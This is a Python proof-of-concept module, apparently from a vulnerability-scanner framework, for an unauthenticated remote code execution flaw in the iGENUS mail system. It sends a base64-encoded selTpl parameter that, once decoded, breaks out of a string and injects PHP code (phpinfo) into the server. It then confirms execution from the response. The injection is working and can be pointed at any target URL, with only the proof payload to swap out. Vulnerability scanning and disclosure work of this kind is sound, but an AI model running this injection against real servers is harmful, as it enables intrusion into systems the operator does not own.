# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'iGENUS_0000' # 平台漏洞编号，留空
    name = 'iGENUS邮件系统一处无需登录的任意代码执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        iGENUS 邮件系统一处无需登录的任意代码执行
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0156126
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'iGENUS(爱琴思邮件系统)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3e920971-7e05-47d3-b59f-dc39844070bc'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "/index.php?selTpl=YWF8YWFhJzsKcGhwaW5mbygpOyM="
            code, head, res, errcode, _ = hh.http(url)
            if code == 200 and 'Configuration File (php.ini) Path' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()